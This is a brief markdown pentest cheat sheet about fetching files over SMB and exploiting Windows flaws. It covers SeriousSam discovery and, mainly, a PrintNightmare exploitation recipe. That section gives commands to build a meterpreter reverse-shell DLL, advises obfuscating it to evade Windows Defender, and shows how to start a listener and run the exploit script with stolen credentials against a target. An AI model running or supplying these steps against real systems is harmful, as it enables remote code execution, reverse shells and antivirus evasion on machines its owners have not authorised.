# Pentest Guides 

## Feching files to Windows host

Linux | Windows
-------|--------
`sudo smbserver.py -smb2support -user complexia -password complexia share $(pwd)` | `\\192.168.1.1\share\$(filename)`
`sudo smbserver.py share $(pwd) -smb2support` | `\\192.168.1.1\share\$(filename)`



## Vulnerabilities - Windows

### -> SeriousSam

***Setup commands***

*Running a script on a low privilege user will cause an error, run the command below*

`Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser`


**Discovery methods**

Method | Command
-------|--------
PowerShell | `.\SeriousSam.ps1`

Link to [Github Repository](https://github.com/romarroca/SeriousSam/blob/main/serioussam.ps1)

### -> PrintNightmare

***Setup commands***

Description | Commands&Links
------------|--------
*Download virtualenv* | `sudo apt install virtualenv`
*Create virtual enviroment by sudo privileges with the command*  | `virtualenv --python=python3 yourdirectory`
*Run*  | `source yourdirectory/bin/activate`
*Git clone & Follow Instructions*  | [Repository](https://github.com/cube0x0/CVE-2021-1675)
*Install the impacket version described in github repository* | [Repository](https://github.com/cube0x0/CVE-2021-1675)
*Create meterpreter payload* | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=0000 -o reverse.dll`
*Meterpreter payload only works when windows defender disabled* | **Obfuscate the payload**

***Exploit commands***

Description | Commands&Links
------------|---------------------------------------------------------------------------------------------------
*Setup smbserver in root mode in virtual enviroment with the correct impacket version* | `smbserver.py share $(pwd) -smb2support`
*Create your multi/handler* | `multi/handler -- > set payload windows/x64/meterpeter/reverse_tcp`
*Run the script* | `python3 CVE-2021-34527.py cyberlabs.com/cyberuser:'Password'@0.0.0.0 '\\0.0.0.0\share\shell.dll`

**Discovery methods**

Method | Command
-------|--------
Script | `rpcdump.py @192.168.1.10 \| egrep 'MS-RPRN\|MS-PAR'`


